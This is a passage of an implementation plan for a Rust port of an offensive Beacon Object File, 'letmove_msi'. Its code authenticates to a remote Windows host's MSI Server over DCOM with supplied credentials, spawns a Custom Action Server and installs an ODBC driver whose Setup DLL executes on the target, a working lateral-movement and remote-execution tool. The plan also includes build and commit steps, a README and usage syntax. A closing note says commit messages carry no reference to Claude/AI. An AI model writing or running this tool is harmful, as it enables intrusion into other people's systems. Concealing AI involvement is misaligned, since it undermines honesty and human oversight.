    bundle: &AuthBundle,
) -> Result<*mut IMsiCustomAction, HRESULT> {
    let hmsi = LoadLibraryW([b'm' as u16, b's' as u16, b'i' as u16, b'.' as u16, b'd' as u16, b'l' as u16, b'l' as u16, 0].as_ptr());
    if hmsi.is_null() {
        eprintln!("[!] LoadLibraryW(msi.dll) failed");
        return Err(-1);
    }
    let rem_api = create_object_from_dll_factory(hmsi, &CLSID_MSIRemoteApi, &IID_IMsiRemoteAPI);
    if rem_api.is_null() {
        eprintln!("[!] Failed to create IMsiRemoteAPI");
        return Err(-1);
    }

    let env = GetEnvironmentStringsW();
    let env_bytes = env_size_wide(env);
    let mut cookie = [0u8; COOKIE_SIZE];
    let mut cookie_size: i32 = COOKIE_SIZE as i32;
    let mut action: *mut IMsiCustomAction = core::ptr::null_mut();
    let mut out_pid: u32 = 0;

    let cfg = server as *mut IMsiConfigurationManager;
    let hr = ((*(*cfg).lpVtbl).CreateCustomActionServer)(
        cfg,
        ICAC64_IMPERSONATED,
        4,
        rem_api,
        env,
        env_bytes,
        0,
        cookie.as_mut_ptr(),
        &mut cookie_size,
        &mut action,
        &mut out_pid,
        FALSE,
    );
    FreeEnvironmentStringsW(env);

    if action.is_null() {
        eprintln!("[!] CreateCustomActionServer: 0x{:08X}", hr as u32);
        ((*(*rem_api).lpVtbl).Release)(rem_api);
        return Err(hr);
    }

    let authed = match auth::setup_auth_on_iunknown(action as *mut IUnknown, bundle, &IID_IMsiCustomAction) {
        Ok(p) => p as *mut IMsiCustomAction,
        Err(e) => {
            eprintln!("[!] setup_auth on IMsiCustomAction: 0x{:08X}", e as u32);
            ((*(*action).lpVtbl).base.Release)(action as *mut IUnknown);
            ((*(*rem_api).lpVtbl).Release)(rem_api);
            return Err(e);
        }
    };

    ((*(*action).lpVtbl).base.Release)(action as *mut IUnknown);
    ((*(*rem_api).lpVtbl).Release)(rem_api);
    Ok(authed)
}
```

- [ ] **Step 3: Wire into main**

Replace the `main` body in `lib.rs` with:

```rust
#[rustbof::main]
fn main(raw: *mut u8, len: usize) {
    let Some(a) = args::parse(raw, len) else { return };
    let bundle = auth::build(a.domain, a.user, a.pass);

    unsafe {
        let server = match msi::auth_msi_server(&bundle, a.host) {
            Ok(p) => p,
            Err(hr) => { eprintln!("[!] auth_msi_server: 0x{:08X}", hr as u32); CoUninitialize(); return; }
        };
        let action = match msi::get_custom_action_server(server, &bundle) {
            Ok(p) => p,
            Err(hr) => {
                eprintln!("[!] get_custom_action_server: 0x{:08X}", hr as u32);
                ((*(*server).lpVtbl).Release)(server);
                CoUninitialize();
                return;
            }
        };
        println!("[+] IMsiCustomAction @ {:p}", action);
        ((*(*action).lpVtbl).base.Release)(action as *mut com::IUnknown);
        ((*(*server).lpVtbl).Release)(server);
        CoUninitialize();
    }
}
```

- [ ] **Step 4: Build**

Run: `cd msi_lateral_mv_rs && cargo make`
Expected: build succeeds.

- [ ] **Step 5: Commit**

```bash
git add msi_lateral_mv_rs/src/msi.rs msi_lateral_mv_rs/src/lib.rs
git commit -m "feat(msi): spawn IMsiCustomAction via CreateCustomActionServer"
```

---

### Task 7: Driver install + config + BoF finalisation

**Files:**
- Create: `msi_lateral_mv_rs/src/install.rs`
- Modify: `msi_lateral_mv_rs/src/lib.rs`
- Reference (read only): `msi_lateral_mv/bof/msi_lateral_mv.c` (lines building `driver_info` block and calling SQL* methods).

**Interfaces:**
- Consumes: `com::IMsiCustomAction`, `windows-sys` `PathFindFileNameW`, `PathRemoveFileSpecW`.
- Produces:
  - `pub unsafe fn install_and_configure(action: *mut IMsiCustomAction, drivername: *const u16, dllpath: *const u16) -> Result<(), HRESULT>`
  - `unsafe fn build_driver_block(drivername: *const u16, dll_filename: *const u16, out: &mut [u16; 512]) -> i32` — writes three NUL-terminated wide sections + trailing NUL, returns section byte count matching C's `driver_len` semantic.

- [ ] **Step 1: Read C reference**

```bash
sed -n '100,190p' msi_lateral_mv/bof/msi_lateral_mv.c
```

Confirm exact byte-count arithmetic. The C computes `driver_len` as `sum-of-wcslen + 3 (per-section NULs) + 1 (final terminator)`; the Rust helper must return the same number.

- [ ] **Step 2: Write `src/install.rs`**

```rust
use core::ptr::null;
use windows_sys::core::HRESULT;
use windows_sys::Win32::UI::Shell::{PathFindFileNameW, PathRemoveFileSpecW};

use rustbof::{eprintln, println};

use crate::com::IMsiCustomAction;

unsafe fn wlen(mut p: *const u16) -> usize {
    if p.is_null() { return 0; }
    let mut n = 0; while *p != 0 { n += 1; p = p.add(1); } n
}

unsafe fn wcopy(mut dst: *mut u16, mut src: *const u16) -> *mut u16 {
    while *src != 0 { *dst = *src; dst = dst.add(1); src = src.add(1); }
    *dst = 0;
    dst
}

unsafe fn build_driver_block(
    drivername: *const u16, dll_filename: *const u16, out: &mut [u16; 512],
) -> i32 {
    // section1 = <drivername>
    // section2 = "Driver=<dll_filename>"
    // section3 = "Setup=<dll_filename>"
    let prefix_driver = [b'D' as u16, b'r' as u16, b'i' as u16, b'v' as u16, b'e' as u16, b'r' as u16, b'=' as u16];
    let prefix_setup  = [b'S' as u16, b'e' as u16, b't' as u16, b'u' as u16, b'p' as u16, b'=' as u16];

    let s1 = wlen(drivername);
    let sf = wlen(dll_filename);
    let s2 = prefix_driver.len() + sf;
    let s3 = prefix_setup.len()  + sf;

    let mut p = out.as_mut_ptr();
    p = wcopy(p, drivername); p = p.add(1);
    for &c in &prefix_driver { *p = c; p = p.add(1); }
    p = wcopy(p, dll_filename); p = p.add(1);
    for &c in &prefix_setup { *p = c; p = p.add(1); }
    p = wcopy(p, dll_filename); p = p.add(1);
    *p = 0;

    (s1 + 1 + s2 + 1 + s3 + 1 + 1) as i32
}

pub unsafe fn install_and_configure(
    action: *mut IMsiCustomAction,
    drivername: *const u16,
    dllpath: *const u16,
) -> Result<(), HRESULT> {
    // Split dllpath into filename + directory.
    let file = PathFindFileNameW(dllpath);
    // Copy dllpath into mutable buffer, strip file spec.
    let mut path_buf = [0u16; 260];
    {
        let n = wlen(dllpath).min(259);
        for i in 0..n { path_buf[i] = *dllpath.add(i); }
        path_buf[n] = 0;
    }
    PathRemoveFileSpecW(path_buf.as_mut_ptr());

    let mut info = [0u16; 512];
    let driver_len = build_driver_block(drivername, file, &mut info);

    let mut usage_count: u32 = 0;
    let mut raw_rc: i32 = 0;
    let mut path_out = [0u16; 256];
    let mut path_out_len: u16 = 0;

    println!("[-] Calling SQLInstallDriverEx");
    let hr = ((*(*action).lpVtbl).SQLInstallDriverEx)(
        action, driver_len, info.as_ptr(), path_buf.as_ptr(),
        path_out.as_mut_ptr(), path_out.len() as u16, &mut path_out_len,
        2, &mut usage_count, &mut raw_rc,
    );

    if hr < 0 || raw_rc == 0 {
        let mut err_code: u32 = 0;
        let mut err_msg = [0u16; 256];
        let mut err_msg_len: u16 = 0;
        ((*(*action).lpVtbl).SQLInstallerError)(
            action, 1, &mut err_code, err_msg.as_mut_ptr(),
            err_msg.len() as u16, &mut err_msg_len,
        );
        eprintln!("[!] SQLInstallDriverEx hr=0x{:08X} rc={}", hr as u32, raw_rc);
        return Err(hr);
    }
    println!("[$] Driver installed. Usage count: {}", usage_count);

    println!("[-] Calling SQLConfigDriver");
    let mut msg = [0u16; 256];
    let mut msg_len: u16 = 0;
    let mut cfg_rc: i32 = 0;
    let hr = ((*(*action).lpVtbl).SQLConfigDriver)(
        action, 1, drivername, null(),
        msg.as_mut_ptr(), msg.len() as u16, &mut msg_len, &mut cfg_rc,
    );
    if hr < 0 {
        let mut err_code: u32 = 0;
        let mut err_msg = [0u16; 256];
        let mut err_msg_len: u16 = 0;
        ((*(*action).lpVtbl).SQLInstallerError)(
            action, 1, &mut err_code, err_msg.as_mut_ptr(),
            err_msg.len() as u16, &mut err_msg_len,
        );
        eprintln!("[!] SQLConfigDriver hr=0x{:08X}", hr as u32);
        return Err(hr);
    }
    println!("[LFG] Driver configured successfully");
    Ok(())
}
```

- [ ] **Step 3: Wire into `lib.rs`**

Final `main`:

```rust
#![no_std]

mod args;
mod auth;
mod com;
mod install;
mod msi;

use rustbof::{eprintln, println};
use windows_sys::Win32::System::Com::CoUninitialize;

#[rustbof::main]
fn main(raw: *mut u8, len: usize) {
    let Some(a) = args::parse(raw, len) else { return };
    let bundle = auth::build(a.domain, a.user, a.pass);

    unsafe {
        let server = match msi::auth_msi_server(&bundle, a.host) {
            Ok(p) => p,
            Err(hr) => { eprintln!("[!] auth_msi_server: 0x{:08X}", hr as u32); CoUninitialize(); return; }
        };
        let action = match msi::get_custom_action_server(server, &bundle) {
            Ok(p) => p,
            Err(hr) => {
                eprintln!("[!] get_custom_action_server: 0x{:08X}", hr as u32);
                ((*(*server).lpVtbl).Release)(server);
                CoUninitialize();
                return;
            }
        };
        if let Err(hr) = install::install_and_configure(action, a.driver, a.dll) {
            eprintln!("[!] install failed: 0x{:08X}", hr as u32);
        } else {
            println!("[+] letmove_msi complete");
        }
        ((*(*action).lpVtbl).base.Release)(action as *mut com::IUnknown);
        ((*(*server).lpVtbl).Release)(server);
        CoUninitialize();
    }
}
```

- [ ] **Step 4: Build and sanity-check the COFF**

Run:
```bash
cd msi_lateral_mv_rs && cargo make
find target -name 'letmove_msi.o' -exec llvm-objdump -h {} \;
```
Expected: build succeeds; sections listed with no fatal warnings. If `llvm-objdump` unavailable, `objdump -h` on the same file is acceptable.

- [ ] **Step 5: Commit**

```bash
git add msi_lateral_mv_rs/src/install.rs msi_lateral_mv_rs/src/lib.rs
git commit -m "feat(install): call SQLInstallDriverEx + SQLConfigDriver"
```

---

### Task 8: README + final commit

**Files:**
- Create: `msi_lateral_mv_rs/README.md`
- Create: `msi_lateral_mv_rs/LICENSE`

**Interfaces:**
- Consumes: nothing.
- Produces: user-facing docs.

- [ ] **Step 1: Write README**

```markdown
# letmove_msi

Rust `no_std` BoF port of [werdhaihai/msi_lateral_mv](https://github.com/werdhaihai/msi_lateral_mv), built on the [joaoviictorti/rustbof](https://github.com/joaoviictorti/rustbof) template.

The BoF authenticates to the MSI Server via DCOM, spawns a Custom Action Server, and calls `SQLInstallDriverEx` + `SQLConfigDriver` on the remote/local system to install an ODBC driver whose Setup DLL executes on the target.

The payload DLL is out of scope for this project; see the upstream `sqldriverdll` for a working sample.

## Build

Requires Rust nightly, [boflink](https://github.com/MEhrn00/boflink), and [cargo-make](https://github.com/sagiegurari/cargo-make).

```bash
cargo make
```

Produces `target/.../letmove_msi.o`.

## Usage

Arguments are a fixed sequence of wide strings — pass empty strings for unused fields:

```
letmove_msi <local|remote> <host> <domain> <user> <pass> <driver> <dll>
```

- `mode`: `local` or `remote`
- `host`: target machine name (required for `remote`, empty for `local`)
- `domain` / `user` / `pass`: alternate credentials (empty = current user)
- `driver`: ODBC driver name
- `dll`: full path to the driver DLL on the *target*

## License

MIT.
```

- [ ] **Step 2: Write LICENSE (MIT)**

Standard MIT license text with copyright line `Copyright (c) 2026 daniagungg`.

- [ ] **Step 3: Commit**

```bash
git add msi_lateral_mv_rs/README.md msi_lateral_mv_rs/LICENSE
git commit -m "docs: add letmove_msi README and license"
```

---

## Self-Review Notes

- Spec coverage: every spec section (layout, args, data flow, COM bindings, auth, error handling, build/testing) is covered by Tasks 1–8.
- No placeholders remain except intentional `<fill: ...>` markers in Task 2 that must be resolved against `msilat.h`; that resolution is explicit and gated by Step 1 of the task.
- Type consistency: `Args` field names/types are stable from Task 3 through Task 7. `AuthBundle` shape is stable from Task 4. Vtable slot signatures declared in Task 2 are what Tasks 5/6/7 call — mismatches must be fixed in Task 2, not at call sites.
- Commit messages contain no reference to Claude/AI.
